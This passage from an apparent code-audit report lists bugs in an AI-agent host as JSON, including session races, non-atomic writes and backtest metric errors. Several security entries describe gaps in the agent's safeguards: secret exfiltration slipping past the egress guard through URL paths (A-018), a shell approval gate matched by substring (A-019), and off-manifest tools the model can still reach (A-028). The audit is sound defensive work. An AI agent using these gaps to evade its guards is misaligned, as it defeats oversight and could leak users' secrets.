    {"id":"A-004","title":"Profile+task-mode prompt composed only in WS lane","severity":"high","confidence":"confirmed","blast_radius":"cross-subsystem","area":"transport","files":["src/copenet/host/rpc_chat.py","src/copenet/core/orchestrator/runtime.py"],"symbols":["compose_prompt","send_chat","effective_system_prompt"],"repair_size":"small","verification_needed":["assert identical composed system prompt across WS/CLI/REST"]},
    {"id":"A-005","title":"Reconnect on active in-flight session loses streamed output","severity":"high","confidence":"confirmed","blast_radius":"subsystem","area":"frontend","files":["src/copenet/host/frontend/src/lib/wsBootstrapAction.ts","src/copenet/host/frontend/src/lib/wsSessionActions.ts","src/copenet/host/frontend/src/lib/wsClient.ts","src/copenet/host/frontend/src/store/useAppStore.ts"],"symbols":["reconcilePendingRuns","loadHistory","pendingAssistants"],"repair_size":"medium","verification_needed":["drop+reconnect during run; answer present after finalize without reload"]},
    {"id":"A-006","title":"chat.send optimistic ack races in-flight check; UI hangs","severity":"medium","confidence":"confirmed","blast_radius":"subsystem","area":"transport","files":["src/copenet/host/rpc_chat.py","src/copenet/host/frontend/src/lib/wsChatActions.ts"],"symbols":["SessionInFlightError"],"repair_size":"small","verification_needed":["two concurrent sends; loser gets terminal error event"]},
    {"id":"A-007","title":"send_chat keys off request.model not session binding","severity":"medium","confidence":"confirmed","blast_radius":"subsystem","area":"session","files":["src/copenet/core/orchestrator/runtime.py","src/copenet/core/sessions/session_store.py"],"symbols":["send_chat","assert_session_binding"],"repair_size":"small","verification_needed":["send_chat model=None uses entry.model in run+stamp"]},
    {"id":"A-008","title":"REST falls back to app.default_model + no SessionInFlightError handling","severity":"medium","confidence":"confirmed","blast_radius":"subsystem","area":"transport","files":["src/copenet/host/app_api.py"],"symbols":["_run_chat","_run_session_chat"],"repair_size":"small","verification_needed":["concurrent REST send returns in_flight not 500","model omitted uses session lock"]},
    {"id":"A-009","title":"SessionStateStore.get() no corruption guard + no fsync","severity":"medium","confidence":"confirmed","blast_radius":"subsystem","area":"persistence","files":["src/copenet/core/sessions/state_store.py"],"symbols":["SessionStateStore.get","save"],"repair_size":"small","verification_needed":["corrupt state file -> fresh default not JSONDecodeError into send_chat"]},
    {"id":"A-010","title":"Hung provider leaves in_flight_run_id stuck; abort only sets event","severity":"medium","confidence":"confirmed","blast_radius":"subsystem","area":"runtime","files":["src/copenet/core/orchestrator/__init__.py","src/copenet/core/orchestrator/runtime.py"],"symbols":["abort","mark_run_finished"],"repair_size":"medium","verification_needed":["fake provider awaits forever; abort clears marker; next send admitted"]},
    {"id":"A-011","title":"Native tool loop discards abort_event; Stop no-op for LM Studio/Ollama","severity":"medium","confidence":"confirmed","blast_radius":"subsystem","area":"harness","files":["src/copenet/core/harness/tool_loop_native.py"],"symbols":["run_native_tool_loop","abort_event"],"repair_size":"small","verification_needed":["set abort after step 1; loop yields final terminalReason=aborted"]},
    {"id":"A-012","title":"Backtest artifact renders wrong benchmark return","severity":"medium","confidence":"confirmed","blast_radius":"subsystem","area":"market","files":["src/copenet/core/tools/handlers/market.py","src/copenet/core/market/backtester.py"],"symbols":["benchmark_total_return"],"repair_size":"small","verification_needed":["four benchmark renderers produce identical cell for known pair"]},
    {"id":"A-013","title":"Synthetic scenario metrics lack machine-readable synthetic flag","severity":"medium","confidence":"medium","blast_radius":"subsystem","area":"market","files":["src/copenet/core/market/backtester.py","src/copenet/core/tools/handlers/market.py"],"symbols":["run_scenario","SCENARIOS"],"repair_size":"small","verification_needed":["scenario metadata carries synthetic=true"]},
    {"id":"A-014","title":"Errored runs render as successful completions when content streamed","severity":"medium","confidence":"confirmed","blast_radius":"subsystem","area":"frontend","files":["src/copenet/host/frontend/src/components/MessageBubble.tsx","src/copenet/host/frontend/src/lib/wsChatEvents.ts"],"symbols":["errorMessage","state"],"repair_size":"small","verification_needed":["mid-stream error shows error affix alongside partial output"]},
    {"id":"A-015","title":"syncActiveRuns wholesale-rebuilds from stale unsequenced sessions.list","severity":"medium","confidence":"medium","blast_radius":"subsystem","area":"frontend","files":["src/copenet/host/frontend/src/store/sessionRuntimeSlice.ts","src/copenet/host/frontend/src/lib/wsSessionActions.ts"],"symbols":["syncActiveRuns"],"repair_size":"small","verification_needed":["overlapping refreshes never flicker Stop off mid-run"]},
    {"id":"A-016","title":"Duplicate assistant bubble when first delta beats chat.send ack","severity":"medium","confidence":"medium","blast_radius":"subsystem","area":"frontend","files":["src/copenet/host/frontend/src/lib/wsChatActions.ts","src/copenet/host/frontend/src/lib/wsChatEvents.ts"],"symbols":["pendingAssistants","registerPendingAssistant"],"repair_size":"small","verification_needed":["delta before send-resolve yields exactly one assistant message"]},
    {"id":"A-017","title":"Persona files written non-atomically despite sibling using atomic","severity":"medium","confidence":"confirmed","blast_radius":"subsystem","area":"persistence","files":["src/copenet/core/persona/service.py"],"symbols":["save_flavor","write_persona_sections"],"repair_size":"small","verification_needed":["partial write raises; prior persona file intact"]},
    {"id":"A-018","title":"Secret exfil bypasses egress guard even with Barricade ON (canary by filename only)","severity":"medium","confidence":"confirmed","blast_radius":"local","area":"security","files":["src/copenet/core/tools/barricade.py"],"symbols":["_record_sensitive_read","_SENSITIVE_PATH_RE","_egress_guard"],"repair_size":"small","verification_needed":["token file read then URL-path exfil blocked when enabled"]},
    {"id":"A-019","title":"High-risk shell approval gate is substring-matched","severity":"medium","confidence":"confirmed","blast_radius":"local","area":"security","files":["src/copenet/core/tools/handlers/shell.py","src/copenet/core/tools/policy.py"],"symbols":["HIGH_RISK_PATTERNS"],"repair_size":"small","verification_needed":["document as non-authoritative; lean on effect-class confirmation"]},
    {"id":"A-020","title":"files.write/edit outside-workspace containment untested","severity":"medium","confidence":"confirmed","blast_radius":"local","area":"testing","files":["src/copenet/core/tools/handlers/_shared.py","tests/unit/test_file_tools.py"],"symbols":["ensure_write_allowed"],"repair_size":"small","verification_needed":["negative tests: write/edit outside workspace -> write_blocked"]},
    {"id":"A-021","title":"Split-adjust invariant has no regression test","severity":"medium","confidence":"confirmed","blast_radius":"local","area":"testing","files":["src/copenet/core/market/data_sources.py","tests/unit"],"symbols":["fetch_ohlcv","auto_adjust"],"repair_size":"small","verification_needed":["assert fetch_ohlcv default auto_adjust=True and/or cache-key adjustment basis"]},
    {"id":"A-022","title":"Persona lock compared against globally-resolved persona","severity":"medium","confidence":"confirmed","blast_radius":"subsystem","area":"session","files":["src/copenet/core/orchestrator/runtime.py","src/copenet/core/persona/service.py","src/copenet/core/sessions/session_store.py"],"symbols":["resolved_persona_id","assert_session_binding"],"repair_size":"small","verification_needed":["global default change; send persona_id=None proceeds on locked persona"]},
    {"id":"A-023","title":"Webull broker cache written non-atomically","severity":"low","confidence":"confirmed","blast_radius":"local","area":"persistence","files":["src/copenet/core/market/webull/client.py","src/copenet/core/market/webull/sync.py"],"symbols":["select_account","save_snapshot"],"repair_size":"small","verification_needed":["route through write_json_atomic"]},
    {"id":"A-024","title":"ProviderAuthStore lock file orphaned on crash","severity":"low","confidence":"confirmed","blast_radius":"local","area":"persistence","files":["src/copenet/core/provider_auth/store.py"],"symbols":["locked"],"repair_size":"small","verification_needed":["stale lock broken by mtime/PID"]},
    {"id":"A-025","title":"benchmark_total_return field misnamed (holds relative outperformance)","severity":"low","confidence":"confirmed","blast_radius":"local","area":"market","files":["src/copenet/core/market/backtester.py"],"symbols":["benchmark_total_return"],"repair_size":"small","verification_needed":["rename to benchmark_relative_return; grep consumers"]},
    {"id":"A-026","title":"Model-facing error names deleted tools files.list/search","severity":"low","confidence":"confirmed","blast_radius":"local","area":"tools","files":["src/copenet/core/tools/handlers/files.py"],"symbols":["read_file"],"repair_size":"small","verification_needed":["message points at files.rg"]},
    {"id":"A-027","title":"Idempotency cache unbounded + stale-return","severity":"low","confidence":"confirmed","blast_radius":"local","area":"runtime","files":["src/copenet/core/orchestrator/__init__.py","src/copenet/core/orchestrator/runtime.py"],"symbols":["_idempotency_cache"],"repair_size":"small","verification_needed":["bounded cache; documented reuse semantics"]},
    {"id":"A-028","title":"MANIFEST_TOOL_IDS advertising-only; off-manifest tools reachable","severity":"low","confidence":"confirmed","blast_radius":"local","area":"harness","files":["src/copenet/core/tools/registry.py"],"symbols":["MANIFEST_TOOL_IDS","execute","list_tools"],"repair_size":"small","verification_needed":["off-manifest id from model blocked; internal caller still succeeds"]},
    {"id":"A-029","title":"Prompted loop drops accumulated tool results across steps","severity":"low","confidence":"confirmed","blast_radius":"local","area":"harness","files":["src/copenet/core/harness/tool_loop_prompted.py"],"symbols":["tool_payloads","_compose_prompted_tool_followup"],"repair_size":"small","verification_needed":["non-resuming prompted provider retains step-1 result at step 3"]},
    {"id":"A-030","title":"Name-based provider branching where capability flag exists","severity":"low","confidence":"confirmed","blast_radius":"local","area":"harness","files":["src/copenet/core/orchestrator/runtime.py","src/copenet/core/harness/tool_loop_common.py"],"symbols":["_RESUME_CLI_PROVIDERS","cli_resume"],"repair_size":"small","verification_needed":["derive cli_resume from capability_profile.resume"]},
    {"id":"A-031","title":"hello-ok features.methods stale (9 dispatched methods unadvertised)","severity":"low","confidence":"confirmed","blast_radius":"local","area":"transport","files":["src/copenet/host/ws_server.py","src/copenet/host/rpc_dispatch.py"],"symbols":["features.methods"],"repair_size":"small","verification_needed":["advertised set == dispatched set"]},
    {"id":"A-032","title":"'no evidence' conflated with 'fetch failed'","severity":"low","confidence":"confirmed","blast_radius":"local","area":"market","files":["src/copenet/core/market/fact_packets.py","src/copenet/core/market/edgar.py"],"symbols":["fact packet evidence line"],"repair_size":"small","verification_needed":["packet text differs empty-window vs fetch-failure"]},
    {"id":"A-033","title":"bfill leading backfill is minor lookahead","severity":"low","confidence":"confirmed","blast_radius":"local","area":"market","files":["src/copenet/core/market/backtester.py"],"symbols":["bfill"],"repair_size":"small","verification_needed":["clamp start_date to first real bar per symbol"]},
    {"id":"A-034","title":"Docs claim deleted top-level shims still exist","severity":"low","confidence":"confirmed","blast_radius":"local","area":"docs","files":["AGENTS.md","docs/ARCHITECTURE.md"],"symbols":[],"repair_size":"small","verification_needed":["drop shim claim from docs"]},
    {"id":"A-035","title":"write_json_atomic lacks fsync + shares one temp name","severity":"low","confidence":"likely","blast_radius":"local","area":"persistence","files":["src/copenet/core/_json_store.py"],"symbols":["write_json_atomic"],"repair_size":"small","verification_needed":["fsync temp before rename; unique temp name"]},
    {"id":"A-036","title":"MemoryRecord timestamp defaults import-time-frozen","severity":"low","confidence":"likely","blast_radius":"local","area":"persistence","files":["src/copenet/core/memory/store.py"],"symbols":["MemoryRecord"],"repair_size":"small","verification_needed":["use field(default_factory=utc_now_iso)"]},
    {"id":"A-037","title":"Unguarded run.toolSteps at sessions.runs boundary","severity":"low","confidence":"low","blast_radius":"local","area":"frontend","files":["src/copenet/host/frontend/src/lib/wsSessionRpc.ts","src/copenet/host/frontend/src/runtime/activityProof.ts"],"symbols":["listSessionRunsRpc","toolSteps"],"repair_size":"small","verification_needed":["run record without toolSteps does not throw"]},
    {"id":"A-038","title":"Dead dispatch/effect-kind branches for retired tool ids","severity":"low","confidence":"confirmed","blast_radius":"local","area":"tools","files":["src/copenet/core/tools/contracts.py","src/copenet/core/runtime/turn_state.py"],"symbols":["context.prepare","files.search","patch.apply"],"repair_size":"small","verification_needed":["remove dead mapping entries"]},
    {"id":"A-039","title":"Provider OAuth tokens stored plaintext (0600)","severity":"informational","confidence":"confirmed","blast_radius":"local","area":"security","files":["src/copenet/core/provider_auth/store.py"],"symbols":["save"],"repair_size":"medium","verification_needed":["defense-in-depth; encryption at rest optional"]},
    {"id":"A-040","title":"web.fetch leaks target URL to jina.ai by default","severity":"informational","confidence":"confirmed","blast_radius":"local","area":"security","files":["src/copenet/core/web_ingest.py"],"symbols":["_extract_via_jina"],"repair_size":"small","verification_needed":["make jina path opt-in"]},
    {"id":"A-041","title":"Research Lab described as durable but has no persistence store","severity":"informational","confidence":"confirmed","blast_radius":"local","area":"contract","files":["src/copenet/core/research_lab/__init__.py","src/copenet/core/research_lab/dossier.py"],"symbols":[],"repair_size":"medium","verification_needed":["reconcile docs with reality or add store"]},
    {"id":"A-042","title":"Telegram route confused-deputy latent (no inbound handler yet)","severity":"informational","confidence":"confirmed","blast_radius":"local","area":"security","files":["src/copenet/core/messaging/routing_store.py","src/copenet/host/rpc_messaging.py"],"symbols":["resolve_messaging_route"],"repair_size":"medium","verification_needed":["wire authz before any inbound Telegram lane"]}
  ]
}
```
